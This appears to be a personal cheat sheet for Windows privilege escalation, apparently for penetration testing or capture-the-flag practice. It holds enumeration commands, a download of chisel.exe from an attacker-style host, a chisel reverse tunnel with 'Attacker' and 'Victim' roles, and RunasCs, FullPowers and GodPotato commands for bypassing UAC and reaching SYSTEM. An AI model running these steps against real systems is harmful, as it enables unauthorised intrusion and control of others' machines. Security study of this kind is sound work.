---
title: Windows Privilege Escalation
---

# Windows Privilege Escalation
## Enum tools
- [Win Peas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

## Resources
- [hacktricks (windows)](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

## Basic Enum
### Powershell
```powershell
# System info
sysinfo
Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object Name, Version, OSArchitecture
Get-CimInstance -ClassName Win32_BIOS | Select-Object Name, Version

# User/Group/Permission info
whoami
whoami /priv
whoami /groups
net share
net user
net user SomeAccount
net localgroup
net localgroup Administrators
net session
net config workstation
Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True'"

# Ports used
netstat -ano

# Scheduled tasks
Get-ScheduledTask
Get-ScheduledTask | where {$_.Principal.UserId -eq "NT AUTHORITY\SYSTEM"}
Get-ScheduledTask | ForEach-Object { [PSCustomObject]@{ TaskName = $_.TaskName; Action = ($_.Actions).Execute } }
Get-ScheduledTask | Where-Object { $_.Principal.LogonType -eq 'InteractiveTokenOrPassword' }

# Processes/Services
Get-Process
Get-Service
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-WmiObject win32_service | Where-Object {$_.StartName -like "NT Authority*"}

# Check installed Software
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
Get-CimInstance -ClassName Win32_Product | Select-Object Name, Version
```

## Utils
### Powershel http fetch
```powershell
Invoke-WebRequest -Uri "http://10.10.10.10:8000/chisel.exe" -OutFile "chisel.exe"
```

### Chisel port forwarding
```powershell
# Attacker
chisel server -p 8000 --reverse

# Victim
chisel client http://x.x.x.x:8000 R:9200:127.0.0.1:9200
```

## runas
```batch
runas /user:Administrator cmd.exe
```
### RunasCs
- [RunasCs](https://github.com/antonioCoco/RunasCs)
```powershell
.\RunasCs.exe user password "shell.exe" --bypass-uac --logon-type 8
```

## FullPowers
When `LocalService` or `NetworkService`
- [Fullpowers](https://github.com/itm4n/FullPowers)

```powershell
.\FullPowers.exe -x
```

## GodPotato
When `ImpersonatePrivilege`
- [GodPotato](https://github.com/BeichenDream/GodPotato)

```powershell
.\GodPotato.exe -cmd "cmd /c whoami"
```
